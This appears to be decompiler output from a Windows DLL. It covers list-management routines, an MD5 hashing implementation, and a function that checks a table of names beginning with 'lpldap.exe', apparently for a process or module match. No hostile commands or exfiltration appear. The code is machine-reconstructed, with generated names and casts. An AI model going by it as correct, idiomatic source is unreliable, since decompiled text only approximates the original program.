undefined4 __thiscall FUN_1003d490(int param_1,short *param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  int iVar6;
  int iVar7;
  undefined4 extraout_ECX;
  int extraout_ECX_00;
  undefined8 uVar8;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10077574;
  local_10 = ExceptionList;
  if ((param_1 != 0) && (*(int *)(param_1 + 0x30) != 0)) {
    ExceptionList = &local_10;
    iVar3 = FUN_10058463(0x24,&DAT_10098020,DAT_100956e0 ^ (uint)&stack0xfffffffc);
    local_8 = 0;
    if (iVar3 == 0) {
      param_2 = (short *)0x0;
    }
    else {
      uVar5 = *(undefined4 *)(param_1 + 0x30);
      if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
        uVar4 = FUN_1000bd10(extraout_ECX,uVar5);
        param_2 = (short *)FUN_1003c4c0(uVar4,uVar5);
      }
      else {
        uVar4 = FUN_1000ba60();
        param_2 = (short *)FUN_1003c4c0(uVar4,uVar5);
      }
    }
    local_8 = 1;
    iVar3 = *(int *)(param_1 + 0x30);
    iVar1 = *(int *)(iVar3 + 4);
    uVar5 = FUN_10019f30(iVar1,*(undefined4 *)(iVar1 + 4),&param_2);
    uVar8 = CONCAT44(uVar5,*(int *)(iVar3 + 8));
    if (*(int *)(iVar3 + 8) == 0x15555554) {
      uVar8 = FUN_10056a6a("list<T> too long");
    }
    iVar7 = (int)param_2;
    iVar6 = (int)((ulonglong)uVar8 >> 0x20);
    *(int *)(iVar3 + 8) = (int)uVar8 + 1;
    *(int *)(iVar1 + 4) = iVar6;
    **(int **)(iVar6 + 4) = iVar6;
    if (param_2 != (short *)0x0) {
      FUN_1003a250();
      thunk_FUN_100579ee(iVar7);
    }
    param_2 = (short *)FUN_10058463(0x44,&DAT_10098020);
    local_8 = 3;
    if (param_2 == (short *)0x0) {
      param_2 = (short *)0x0;
    }
    else {
      param_2 = (short *)FUN_1003d100(*(undefined4 *)
                                       (*(int *)(*(int *)(*(int *)(param_1 + 0x30) + 4) + 4) + 8),
                                      *(undefined4 *)(param_1 + 0x34));
    }
    local_8 = 4;
    iVar3 = *(int *)(param_1 + 0x34);
    iVar1 = *(int *)(iVar3 + 0x38);
    iVar6 = FUN_10019f30(iVar1,*(undefined4 *)(iVar1 + 4),&param_2);
    iVar7 = *(int *)(iVar3 + 0x3c);
    if (iVar7 == 0x15555554) {
      iVar7 = FUN_10056a6a("list<T> too long");
      iVar6 = extraout_ECX_00;
    }
    iVar2 = (int)param_2;
    *(int *)(iVar3 + 0x3c) = iVar7 + 1;
    *(int *)(iVar1 + 4) = iVar6;
    local_8 = 0xffffffff;
    **(int **)(iVar6 + 4) = iVar6;
    if (param_2 != (short *)0x0) {
      FUN_1003d1f0();
      thunk_FUN_100579ee(iVar2);
    }
    ExceptionList = local_10;
    return *(undefined4 *)(*(int *)(*(int *)(*(int *)(param_1 + 0x34) + 0x38) + 4) + 8);
  }
  return 0;
}



/* Function: FUN_1003d650 */

int * __thiscall FUN_1003d650(int param_1,int *param_2)

{
  char cVar1;
  int *piVar2;
  int *piVar3;
  int iVar4;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar5;
  int *piVar6;
  int *local_20;
  int *local_1c;
  int *local_18;
  char local_11;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10077598;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_1c = (int *)param_1;
  if ((DAT_1009b614 & 1) == 0) {
    DAT_1009b614 = DAT_1009b614 | 1;
    DAT_1009b618 = 0;
    FUN_10057b51(&LAB_10078910,DAT_100956e0 ^ (uint)&stack0xfffffffc);
  }
  if (param_1 == 0) {
    ExceptionList = local_10;
    return &DAT_1009b618;
  }
  if ((param_2 == (int *)0x0) || (*(short *)param_2 != 0)) {
    piVar2 = (int *)FUN_1000bd10();
  }
  else {
    piVar2 = (int *)FUN_1000ba60();
  }
  piVar6 = (int *)(*(int *)(param_1 + 0x30) + 0x10);
  local_20 = piVar6;
  local_18 = piVar2;
  piVar3 = (int *)FUN_1001d340(&local_18);
  piVar6 = (int *)*piVar6;
  if (piVar3 == piVar6) {
LAB_1003d713:
    local_18 = piVar6;
  }
  else {
    cVar1 = FUN_1001d1f0(&local_18,piVar3 + 4);
    local_18 = piVar3;
    if (cVar1 != '\0') goto LAB_1003d713;
  }
  local_11 = (int *)*local_20 == local_18;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar2;
    *piVar2 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = local_1c;
  if (local_11 != '\0') {
    piVar6 = (int *)(*(int *)((int)local_1c + 0x34) + 0x2c);
    *piVar6 = *piVar6 + 1;
  }
  if ((param_2 == (int *)0x0) || (*(short *)param_2 != 0)) {
    piVar6 = (int *)FUN_1000bd10();
  }
  else {
    piVar6 = (int *)FUN_1000ba60();
  }
  local_8 = 0;
  local_1c = (int *)(*(int *)((int)piVar2 + 0x30) + 0x10);
  param_2 = piVar6;
  piVar2 = (int *)FUN_1001d340(&param_2);
  uVar5 = extraout_ECX;
  if (piVar2 != (int *)*local_1c) {
    cVar1 = FUN_1001d1f0(&param_2,piVar2 + 4);
    uVar5 = extraout_ECX_00;
    if (cVar1 == '\0') goto LAB_1003d7d1;
  }
  local_20 = (int *)&param_2;
  iVar4 = FUN_1001daa0(uVar5,&local_20,uVar5);
  FUN_1001dd20(&local_20,piVar2,iVar4 + 0x10,iVar4);
  piVar2 = local_20;
  piVar6 = param_2;
LAB_1003d7d1:
  if (piVar6 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar6;
    *piVar6 = *piVar6 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar6);
    }
  }
  ExceptionList = local_10;
  return piVar2 + 5;
}



/* Function: FUN_1003d800 */

bool __thiscall FUN_1003d800(int param_1,int *param_2)

{
  int iVar1;
  char cVar2;
  int *piVar3;
  int *piVar4;
  int iVar5;
  bool bVar6;
  
  if (param_1 != 0) {
    if ((param_2 == (int *)0x0) || (*(short *)param_2 != 0)) {
      piVar3 = (int *)FUN_1000bd10();
    }
    else {
      piVar3 = (int *)FUN_1000ba60();
    }
    piVar4 = (int *)(*(int *)(param_1 + 0x30) + 0x10);
    param_2 = piVar3;
    iVar5 = FUN_1001d340(&param_2);
    iVar1 = *piVar4;
    if ((iVar5 == iVar1) ||
       (cVar2 = FUN_1001d1f0(&param_2,iVar5 + 0x10), param_2 = (int *)iVar5, cVar2 != '\0')) {
      param_2 = (int *)iVar1;
    }
    bVar6 = (int *)*piVar4 != param_2;
    param_2._3_1_ = bVar6;
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar3;
      *piVar3 = *piVar3 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
    return param_2._3_1_ != '\0';
  }
  return false;
}



/* Function: FUN_1003d8b0 */

undefined4 * __fastcall FUN_1003d8b0(int param_1)

{
  undefined4 *puVar1;
  
  if ((DAT_1009b61c & 1) == 0) {
    DAT_1009b61c = DAT_1009b61c | 1;
    DAT_1009b620 = 0;
    FUN_10057b51(&LAB_10078930);
  }
  puVar1 = &DAT_1009b620;
  if (param_1 != 0) {
    puVar1 = *(undefined4 **)(param_1 + 0x30);
  }
  return puVar1;
}



/* Function: FUN_1003d8f0 */

void __fastcall FUN_1003d8f0(undefined4 *param_1)

{
  FUN_1003d910();
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_1003d910 */

void __fastcall FUN_1003d910(int *param_1)

{
  int *piVar1;
  int iVar2;
  int *piVar3;
  
  piVar1 = (int *)*param_1;
  piVar3 = (int *)*piVar1;
  *piVar1 = (int)piVar1;
  *(int *)(*param_1 + 4) = *param_1;
  param_1[1] = 0;
  if (piVar3 != (int *)*param_1) {
    do {
      iVar2 = piVar3[2];
      piVar1 = (int *)*piVar3;
      if (iVar2 != 0) {
        FUN_1003d1f0();
        thunk_FUN_100579ee(iVar2);
      }
      piVar3[2] = 0;
      thunk_FUN_100579ee(piVar3);
      piVar3 = piVar1;
    } while (piVar1 != (int *)*param_1);
  }
  return;
}



/* Function: FUN_1003d970 */

void __fastcall FUN_1003d970(int *param_1)

{
  int iVar1;
  
  iVar1 = *param_1;
  if (iVar1 != 0) {
    FUN_1003d1f0();
    thunk_FUN_100579ee(iVar1);
  }
  *param_1 = 0;
  return;
}



/* Function: FUN_1003d9a0 */

undefined1 FUN_1003d9a0(void)

{
  char *pcVar1;
  uint uVar2;
  int *piVar3;
  int iVar4;
  undefined **ppuVar5;
  int *piVar6;
  int *local_18;
  undefined1 local_11;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100775c8;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_11 = 0;
  local_18 = (int *)0x0;
  local_8 = 0;
  ppuVar5 = &PTR_s_lpldap_exe_10084fb0;
  do {
    pcVar1 = *ppuVar5;
    if ((pcVar1 == (char *)0x0) || (*pcVar1 == '\0')) {
      if (local_18 != (int *)0x0) {
        if (*local_18 == 0) {
          local_18[2] = 0;
          *(undefined2 *)(local_18 + 3) = 0;
          goto LAB_1003da26;
        }
        LOCK();
        iVar4 = *local_18;
        *local_18 = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_18,uVar2);
        }
      }
      local_18 = (int *)0x0;
    }
    else {
      local_18 = (int *)FUN_1000c0a0(pcVar1,0xffffffff);
    }
LAB_1003da26:
    if (local_18 == (int *)0x0) {
      iVar4 = 0;
      piVar6 = (int *)0x0;
    }
    else {
      iVar4 = local_18[2];
      piVar6 = local_18 + 3;
    }
    if (iVar4 == -1) {
      if (piVar6 == (int *)0x0) {
        iVar4 = 0;
      }
      else {
        piVar3 = piVar6;
        do {
          iVar4 = *piVar3;
          piVar3 = (int *)((int)piVar3 + 2);
        } while ((short)iVar4 != 0);
        iVar4 = (int)piVar3 - ((int)piVar6 + 2) >> 1;
      }
    }
    iVar4 = FUN_1004b640(piVar6,iVar4);
    if (iVar4 != -1) {
      local_11 = 1;
      goto LAB_1003daa6;
    }
    ppuVar5 = ppuVar5 + -1;
    if ((int)ppuVar5 < 0x10084d70) {
LAB_1003daa6:
      if (local_18 != (int *)0x0) {
        LOCK();
        iVar4 = *local_18;
        *local_18 = *local_18 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_18,uVar2);
        }
      }
      ExceptionList = local_10;
      return local_11;
    }
  } while( true );
}



/* Function: FUN_1003dae0 */

void __fastcall FUN_1003dae0(int param_1,undefined4 *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  
  uVar5 = *(uint *)(param_1 + 0x10);
  uVar4 = uVar5 + param_3 * 8;
  *(uint *)(param_1 + 0x10) = uVar4;
  if (uVar4 < uVar5) {
    *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + 1;
  }
  *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + (param_3 >> 0x1d);
  uVar5 = uVar5 >> 3 & 0x3f;
  uVar4 = param_3;
  if (uVar5 != 0) {
    uVar4 = 0x40 - uVar5;
    iVar6 = param_1 + 0x18 + uVar5;
    if (param_3 < uVar4) {
      FUN_1005d740(iVar6,param_2,param_3);
      return;
    }
    FUN_1005d740(iVar6,param_2,uVar4);
    FUN_1003dc40();
    param_2 = (undefined4 *)((int)param_2 + uVar4);
    uVar4 = param_3 - uVar4;
  }
  if (0x3f < uVar4) {
    param_3 = uVar4 >> 6;
    do {
      uVar1 = param_2[1];
      uVar2 = param_2[2];
      uVar3 = param_2[3];
      *(undefined4 *)(param_1 + 0x18) = *param_2;
      *(undefined4 *)(param_1 + 0x1c) = uVar1;
      *(undefined4 *)(param_1 + 0x20) = uVar2;
      *(undefined4 *)(param_1 + 0x24) = uVar3;
      uVar1 = param_2[5];
      uVar2 = param_2[6];
      uVar3 = param_2[7];
      *(undefined4 *)(param_1 + 0x28) = param_2[4];
      *(undefined4 *)(param_1 + 0x2c) = uVar1;
      *(undefined4 *)(param_1 + 0x30) = uVar2;
      *(undefined4 *)(param_1 + 0x34) = uVar3;
      uVar1 = param_2[9];
      uVar2 = param_2[10];
      uVar3 = param_2[0xb];
      *(undefined4 *)(param_1 + 0x38) = param_2[8];
      *(undefined4 *)(param_1 + 0x3c) = uVar1;
      *(undefined4 *)(param_1 + 0x40) = uVar2;
      *(undefined4 *)(param_1 + 0x44) = uVar3;
      uVar1 = param_2[0xd];
      uVar2 = param_2[0xe];
      uVar3 = param_2[0xf];
      *(undefined4 *)(param_1 + 0x48) = param_2[0xc];
      *(undefined4 *)(param_1 + 0x4c) = uVar1;
      *(undefined4 *)(param_1 + 0x50) = uVar2;
      *(undefined4 *)(param_1 + 0x54) = uVar3;
      FUN_1003dc40();
      param_2 = param_2 + 0x10;
      uVar4 = uVar4 - 0x40;
      param_3 = param_3 - 1;
    } while (param_3 != 0);
  }
  FUN_1005d740(param_1 + 0x18,param_2,uVar4);
  return;
}



/* Function: FUN_1003dbb0 */

void __fastcall FUN_1003dbb0(undefined4 *param_1,undefined4 *param_2)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  
  uVar4 = (uint)param_2[4] >> 3 & 0x3f;
  uVar5 = -uVar4 + 0x3f;
  *(undefined1 *)((int)param_2 + uVar4 + 0x18) = 0x80;
  iVar6 = (int)param_2 + uVar4 + 0x19;
  if (uVar5 < 8) {
    FUN_1005ff60(iVar6,0,uVar5);
    FUN_1003dc40();
    FUN_1005ff60(param_2 + 6,0,0x38);
  }
  else {
    FUN_1005ff60(iVar6,0,-uVar4 + 0x37);
  }
  param_2[0x14] = param_2[4];
  param_2[0x15] = param_2[5];
  FUN_1003dc40();
  uVar1 = param_2[1];
  uVar2 = param_2[2];
  uVar3 = param_2[3];
  *param_1 = *param_2;
  param_1[1] = uVar1;
  param_1[2] = uVar2;
  param_1[3] = uVar3;
  *param_2 = 0;
  return;
}



/* Function: FUN_1003dc40 */

void __fastcall FUN_1003dc40(int *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  uint uVar17;
  uint uVar18;
  uint uVar19;
  uint uVar20;
  uint uVar21;
  uint uVar22;
  
  uVar18 = param_1[3];
  uVar20 = param_1[2];
  iVar1 = *param_2;
  uVar17 = *param_1 + -0x28955b88 + ((uVar18 ^ uVar20) & param_1[1] ^ uVar18) + iVar1;
  uVar17 = (uVar17 * 0x80 | uVar17 >> 0x19) + param_1[1];
  iVar2 = param_2[1];
  uVar18 = uVar18 + 0xe8c7b756 + ((uVar20 ^ param_1[1]) & uVar17 ^ uVar20) + iVar2;
  iVar3 = param_2[2];
  uVar19 = (uVar18 * 0x1000 | uVar18 >> 0x14) + uVar17;
  uVar18 = uVar20 + 0x242070db + ((param_1[1] ^ uVar17) & uVar19 ^ param_1[1]) + iVar3;
  iVar4 = param_2[3];
  uVar21 = (uVar18 >> 0xf | uVar18 * 0x20000) + uVar19;
  uVar18 = param_1[1] + -0x3e423112 + ((uVar19 ^ uVar17) & uVar21 ^ uVar17) + iVar4;
  uVar22 = (uVar18 >> 10 | uVar18 * 0x400000) + uVar21;
  iVar5 = param_2[4];
  uVar17 = uVar17 + ((uVar19 ^ uVar21) & uVar22 ^ uVar19) + 0xf57c0faf + param_2[4];
  iVar6 = param_2[5];
  uVar18 = (uVar17 * 0x80 | uVar17 >> 0x19) + uVar22;
  uVar19 = uVar19 + ((uVar21 ^ uVar22) & uVar18 ^ uVar21) + 0x4787c62a + param_2[5];
  iVar7 = param_2[6];
  uVar20 = (uVar19 * 0x1000 | uVar19 >> 0x14) + uVar18;
  uVar21 = uVar21 + ((uVar22 ^ uVar18) & uVar20 ^ uVar22) + 0xa8304613 + param_2[6];
  iVar8 = param_2[7];
  uVar19 = (uVar21 >> 0xf | uVar21 * 0x20000) + uVar20;
  uVar22 = uVar22 + ((uVar20 ^ uVar18) & uVar19 ^ uVar18) + 0xfd469501 + param_2[7];
  iVar9 = param_2[8];
  uVar21 = (uVar22 >> 10 | uVar22 * 0x400000) + uVar19;
  iVar10 = param_2[9];
  uVar18 = uVar18 + ((uVar20 ^ uVar19) & uVar21 ^ uVar20) + 0x698098d8 + param_2[8];
  uVar18 = (uVar18 * 0x80 | uVar18 >> 0x19) + uVar21;
  uVar20 = uVar20 + 0x8b44f7af + ((uVar19 ^ uVar21) & uVar18 ^ uVar19) + iVar10;
  uVar17 = (uVar20 * 0x1000 | uVar20 >> 0x14) + uVar18;
  iVar11 = param_2[10];
  uVar19 = uVar19 + (((uVar21 ^ uVar18) & uVar17 ^ uVar21) - 0xa44f) + param_2[10];
  iVar12 = param_2[0xb];
  uVar19 = (uVar19 >> 0xf | uVar19 * 0x20000) + uVar17;
  iVar13 = param_2[0xc];
  uVar21 = uVar21 + ((uVar17 ^ uVar18) & uVar19 ^ uVar18) + 0x895cd7be + param_2[0xb];
  uVar21 = (uVar21 >> 10 | uVar21 * 0x400000) + uVar19;
  uVar18 = uVar18 + 0x6b901122 + ((uVar17 ^ uVar19) & uVar21 ^ uVar17) + iVar13;
  uVar20 = (uVar18 * 0x80 | uVar18 >> 0x19) + uVar21;
  iVar14 = param_2[0xd];
  uVar18 = uVar17 + 0xfd987193 + ((uVar19 ^ uVar21) & uVar20 ^ uVar19) + param_2[0xd];
  iVar15 = param_2[0xe];
  uVar17 = (uVar18 * 0x1000 | uVar18 >> 0x14) + uVar20;
  uVar18 = uVar19 + 0xa679438e + ((uVar21 ^ uVar20) & uVar17 ^ uVar21) + iVar15;
  uVar19 = (uVar18 >> 0xf | uVar18 * 0x20000) + uVar17;
  iVar16 = param_2[0xf];
  uVar18 = uVar21 + 0x49b40821 + ((uVar17 ^ uVar20) & uVar19 ^ uVar20) + iVar16;
  uVar18 = (uVar18 >> 10 | uVar18 * 0x400000) + uVar19;
  uVar20 = uVar20 + ((uVar19 ^ uVar18) & uVar17 ^ uVar19) + 0xf61e2562 + iVar2;
  uVar20 = (uVar20 * 0x20 | uVar20 >> 0x1b) + uVar18;
  uVar17 = uVar17 + ((uVar18 ^ uVar20) & uVar19 ^ uVar18) + 0xc040b340 + iVar7;
  uVar17 = (uVar17 * 0x200 | uVar17 >> 0x17) + uVar20;
  uVar19 = uVar19 + ((uVar17 ^ uVar20) & uVar18 ^ uVar20) + 0x265e5a51 + iVar12;
  uVar19 = (uVar19 * 0x4000 | uVar19 >> 0x12) + uVar17;
  uVar18 = uVar18 + ((uVar17 ^ uVar19) & uVar20 ^ uVar17) + 0xe9b6c7aa + iVar1;
  uVar18 = (uVar18 >> 0xc | uVar18 * 0x100000) + uVar19;
  uVar20 = uVar20 + ((uVar19 ^ uVar18) & uVar17 ^ uVar19) + 0xd62f105d + iVar6;
  uVar20 = (uVar20 * 0x20 | uVar20 >> 0x1b) + uVar18;
  uVar17 = uVar17 + ((uVar18 ^ uVar20) & uVar19 ^ uVar18) + 0x2441453 + iVar11;
  uVar17 = (uVar17 * 0x200 | uVar17 >> 0x17) + uVar20;
  uVar19 = uVar19 + ((uVar17 ^ uVar20) & uVar18 ^ uVar20) + 0xd8a1e681 + iVar16;
  uVar19 = (uVar19 * 0x4000 | uVar19 >> 0x12) + uVar17;
  uVar18 = uVar18 + ((uVar17 ^ uVar19) & uVar20 ^ uVar17) + 0xe7d3fbc8 + iVar5;
  uVar18 = (uVar18 >> 0xc | uVar18 * 0x100000) + uVar19;
  uVar20 = uVar20 + ((uVar19 ^ uVar18) & uVar17 ^ uVar19) + 0x21e1cde6 + iVar10;
  uVar20 = (uVar20 * 0x20 | uVar20 >> 0x1b) + uVar18;
  uVar17 = uVar17 + 0xc33707d6 + ((uVar18 ^ uVar20) & uVar19 ^ uVar18) + iVar15;
  uVar17 = (uVar17 * 0x200 | uVar17 >> 0x17) + uVar20;
  uVar19 = uVar19 + ((uVar17 ^ uVar20) & uVar18 ^ uVar20) + 0xf4d50d87 + iVar4;
  uVar21 = (uVar19 * 0x4000 | uVar19 >> 0x12) + uVar17;
  uVar18 = uVar18 + ((uVar17 ^ uVar21) & uVar20 ^ uVar17) + 0x455a14ed + iVar9;
  uVar18 = (uVar18 >> 0xc | uVar18 * 0x100000) + uVar21;
  uVar20 = uVar20 + 0xa9e3e905 + ((uVar21 ^ uVar18) & uVar17 ^ uVar21) + iVar14;
  uVar19 = (uVar20 * 0x20 | uVar20 >> 0x1b) + uVar18;
  uVar20 = uVar17 + 0xfcefa3f8 + ((uVar18 ^ uVar19) & uVar21 ^ uVar18) + iVar3;
  uVar22 = (uVar20 * 0x200 | uVar20 >> 0x17) + uVar19;
  uVar20 = uVar21 + 0x676f02d9 + ((uVar22 ^ uVar19) & uVar18 ^ uVar19) + iVar8;
  uVar20 = (uVar20 * 0x4000 | uVar20 >> 0x12) + uVar22;
  uVar18 = uVar18 + 0x8d2a4c8a + ((uVar22 ^ uVar20) & uVar19 ^ uVar22) + iVar13;
  uVar18 = (uVar18 >> 0xc | uVar18 * 0x100000) + uVar20;
  uVar19 = uVar19 + ((uVar22 ^ uVar20 ^ uVar18) - 0x5c6be) + iVar6;
  uVar17 = (uVar19 * 0x10 | uVar19 >> 0x1c) + uVar18;
  uVar22 = uVar22 + (uVar20 ^ uVar18 ^ uVar17) + 0x8771f681 + iVar9;
  uVar19 = (uVar22 * 0x800 | uVar22 >> 0x15) + uVar17;
  uVar20 = uVar20 + (uVar19 ^ uVar18 ^ uVar17) + 0x6d9d6122 + iVar12;
  uVar20 = (uVar20 * 0x10000 | uVar20 >> 0x10) + uVar19;
  uVar18 = uVar18 + (uVar19 ^ uVar20 ^ uVar17) + 0xfde5380c + iVar15;
  uVar18 = (uVar18 >> 9 | uVar18 * 0x800000) + uVar20;
  uVar17 = uVar17 + (uVar19 ^ uVar20 ^ uVar18) + 0xa4beea44 + iVar2;
  uVar17 = (uVar17 * 0x10 | uVar17 >> 0x1c) + uVar18;
  uVar19 = uVar19 + (uVar20 ^ uVar18 ^ uVar17) + 0x4bdecfa9 + iVar5;
  uVar21 = (uVar19 * 0x800 | uVar19 >> 0x15) + uVar17;
  uVar20 = uVar20 + (uVar21 ^ uVar18 ^ uVar17) + 0xf6bb4b60 + iVar8;
  uVar20 = (uVar20 * 0x10000 | uVar20 >> 0x10) + uVar21;
  uVar18 = uVar18 + (uVar21 ^ uVar20 ^ uVar17) + 0xbebfbc70 + iVar11;
  uVar18 = (uVar18 >> 9 | uVar18 * 0x800000) + uVar20;
  uVar17 = uVar17 + (uVar21 ^ uVar20 ^ uVar18) + 0x289b7ec6 + iVar14;
  uVar19 = (uVar17 * 0x10 | uVar17 >> 0x1c) + uVar18;
  uVar21 = uVar21 + (uVar20 ^ uVar18 ^ uVar19) + 0xeaa127fa + iVar1;
  uVar21 = (uVar21 * 0x800 | uVar21 >> 0x15) + uVar19;
  uVar20 = uVar20 + (uVar21 ^ uVar18 ^ uVar19) + 0xd4ef3085 + iVar4;
  uVar17 = (uVar20 * 0x10000 | uVar20 >> 0x10) + uVar21;
  uVar18 = uVar18 + (uVar21 ^ uVar17 ^ uVar19) + 0x4881d05 + iVar7;
  uVar20 = (uVar18 >> 9 | uVar18 * 0x800000) + uVar17;
  uVar18 = (uVar21 ^ uVar17 ^ uVar20) + iVar10 + uVar19 + 0xd9d4d039;
  uVar18 = (uVar18 * 0x10 | uVar18 >> 0x1c) + uVar20;
  uVar19 = uVar21 + 0xe6db99e5 + (uVar17 ^ uVar20 ^ uVar18) + iVar13;
  uVar19 = (uVar19 * 0x800 | uVar19 >> 0x15) + uVar18;
  uVar17 = (uVar19 ^ uVar20 ^ uVar18) + 0x1fa27cf8 + iVar16 + uVar17;
  uVar21 = (uVar17 * 0x10000 | uVar17 >> 0x10) + uVar19;
  uVar20 = uVar20 + (uVar19 ^ uVar21 ^ uVar18) + 0xc4ac5665 + iVar3;
  uVar20 = (uVar20 >> 9 | uVar20 * 0x800000) + uVar21;
  uVar18 = uVar18 + ((~uVar19 | uVar20) ^ uVar21) + 0xf4292244 + iVar1;
  uVar18 = (uVar18 * 0x40 | uVar18 >> 0x1a) + uVar20;
  uVar19 = uVar19 + ((~uVar21 | uVar18) ^ uVar20) + 0x432aff97 + iVar8;
  uVar17 = (uVar19 * 0x400 | uVar19 >> 0x16) + uVar18;
  uVar21 = uVar21 + ((~uVar20 | uVar17) ^ uVar18) + 0xab9423a7 + iVar15;
  uVar19 = (uVar21 * 0x8000 | uVar21 >> 0x11) + uVar17;
  uVar20 = uVar20 + ((~uVar18 | uVar19) ^ uVar17) + 0xfc93a039 + iVar6;
  uVar20 = (uVar20 >> 0xb | uVar20 * 0x200000) + uVar19;
  uVar18 = uVar18 + ((~uVar17 | uVar20) ^ uVar19) + 0x655b59c3 + iVar13;
  uVar18 = (uVar18 * 0x40 | uVar18 >> 0x1a) + uVar20;
  uVar17 = uVar17 + ((~uVar19 | uVar18) ^ uVar20) + 0x8f0ccc92 + iVar4;
  uVar17 = (uVar17 * 0x400 | uVar17 >> 0x16) + uVar18;
  uVar19 = uVar19 + (((~uVar20 | uVar17) ^ uVar18) - 0x100b83) + iVar11;
  uVar21 = (uVar19 * 0x8000 | uVar19 >> 0x11) + uVar17;
  uVar20 = uVar20 + ((~uVar18 | uVar21) ^ uVar17) + 0x85845dd1 + iVar2;
  uVar20 = (uVar20 >> 0xb | uVar20 * 0x200000) + uVar21;
  uVar18 = uVar18 + ((~uVar17 | uVar20) ^ uVar21) + 0x6fa87e4f + iVar9;
  uVar18 = (uVar18 * 0x40 | uVar18 >> 0x1a) + uVar20;
  uVar17 = uVar17 + ((~uVar21 | uVar18) ^ uVar20) + 0xfe2ce6e0 + iVar16;
  uVar19 = (uVar17 * 0x400 | uVar17 >> 0x16) + uVar18;
  uVar17 = uVar21 + 0xa3014314 + ((~uVar20 | uVar19) ^ uVar18) + iVar7;
  uVar17 = (uVar17 * 0x8000 | uVar17 >> 0x11) + uVar19;
  uVar20 = uVar20 + ((~uVar18 | uVar17) ^ uVar19) + 0x4e0811a1 + iVar14;
  uVar20 = (uVar20 >> 0xb | uVar20 * 0x200000) + uVar17;
  uVar18 = uVar18 + 0xf7537e82 + ((~uVar19 | uVar20) ^ uVar17) + iVar5;
  uVar21 = (uVar18 * 0x40 | uVar18 >> 0x1a) + uVar20;
  uVar19 = uVar19 + ((~uVar17 | uVar21) ^ uVar20) + 0xbd3af235 + iVar12;
  uVar19 = (uVar19 * 0x400 | uVar19 >> 0x16) + uVar21;
  uVar18 = uVar17 + 0x2ad7d2bb + ((~uVar20 | uVar19) ^ uVar21) + iVar3;
  *param_1 = *param_1 + uVar21;
  uVar17 = (uVar18 * 0x8000 | uVar18 >> 0x11) + uVar19;
  param_1[2] = param_1[2] + uVar17;
  uVar18 = uVar20 + 0xeb86d391 + ((~uVar21 | uVar17) ^ uVar19) + iVar10;
  param_1[1] = param_1[1] + (uVar18 >> 0xb | uVar18 * 0x200000) + uVar17;
  param_1[3] = param_1[3] + uVar19;
  return;
}



/* Function: FUN_1003e2c0 */

void __thiscall FUN_1003e2c0(undefined4 *param_1,int *param_2)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined1 local_28 [16];
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100775f8;
  local_10 = ExceptionList;
  local_18 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = 0;
  local_8 = 0;
  uVar4 = 0x67452301;
  uVar5 = 0xefcdab89;
  uVar6 = 0x98badcfe;
  uVar7 = 0x10325476;
  uVar8 = 0;
  uVar9 = 0;
  if (*param_2 == 0) {
    uVar1 = 0;
  }
  else {
    uVar1 = *(undefined4 *)(*param_2 + 8);
  }
  puVar3 = param_1;
  FUN_1003dae0(uVar1,local_18);
  FUN_1003dbb0();
  iVar2 = 0;
  do {
    FUN_1003e3a0(param_1,&DAT_10089afc,local_28[iVar2]);
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x10);
  ExceptionList = local_10;
  FUN_100579df(puVar3,uVar4,uVar5,uVar6,uVar7,uVar8,uVar9);
  return;
}



/* Function: FUN_1003e3a0 */

void FUN_1003e3a0(undefined4 *param_1,undefined4 param_2)

{
  undefined4 uVar1;
  
  uVar1 = FUN_1003e3c0(param_2,&stack0x0000000c);
  *param_1 = uVar1;
  return;
}



/* Function: FUN_1003e3c0 */

int * __thiscall FUN_1003e3c0(int *param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_1 == (int *)0x0) {
LAB_1003e440:
    uVar4 = 0;
  }
  else {
    if (*param_1 != 0) {
      iVar1 = FUN_1004c430(param_2,param_3);
      if (iVar1 == 0) {
        return param_1;
      }
      piVar2 = (int *)FUN_100074a0(param_1[2] + iVar1,1);
